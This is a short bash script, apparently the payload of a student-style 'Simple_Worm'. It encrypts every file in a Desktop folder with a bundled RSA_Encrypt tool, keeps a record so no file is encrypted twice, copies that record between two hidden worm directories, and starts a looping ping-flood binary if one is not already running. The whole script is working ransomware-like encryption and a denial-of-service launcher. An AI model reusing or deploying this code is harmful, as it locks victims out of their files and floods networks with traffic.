#!/bin/bash

KEY_N=126419
KEY_E=30743
DIR_2_ENCRYPT="/home/attacker/Desktop"
TARGET_DIR_1="/home/attacker/Public/.Simple_Worm"
TARGET_DIR_2="/home/attacker/Desktop/.Backup"

if [ $1 -eq 1 ]; then
	LOCAL="$TARGET_DIR_1"
else
	LOCAL="$TARGET_DIR_2"
fi

DESKTOP_FILES="$LOCAL/desktop.tmp"
ENCRYPTED_FILES="$LOCAL/encrypted_file_in_desktop"
RSA_CMD="$LOCAL/RSA_Encrypt -C $KEY_N $KEY_E "
FLOOD_CMD="$LOCAL/Loop_ping"

# test encryption record file exist or not
test -e $ENCRYPTED_FILES || touch $ENCRYPTED_FILES

# RSA_encrypt and dont encrypt a file twice
ls $DIR_2_ENCRYPT | cat >$DESKTOP_FILES

while read file;	do
	file_path="$DIR_2_ENCRYPT/$file"
	if ! grep -Fxq "$file" $ENCRYPTED_FILES; then
		$RSA_CMD $file_path
		echo $file >> $ENCRYPTED_FILES
	fi
done <$DESKTOP_FILES

rm -r $DESKTOP_FILES

if [ $1 -eq 1 ]; then
	test -d $TARGET_DIR_2 && cp $ENCRYPTED_FILES $TARGET_DIR_2
else
	test -d $TARGET_DIR_1 && cp $ENCRYPTED_FILES $TARGET_DIR_1
fi


# ping flood but only exec when it hasnt been exec
if ! pgrep -x "Loop_ping" > /dev/null
then
	$FLOOD_CMD
fi

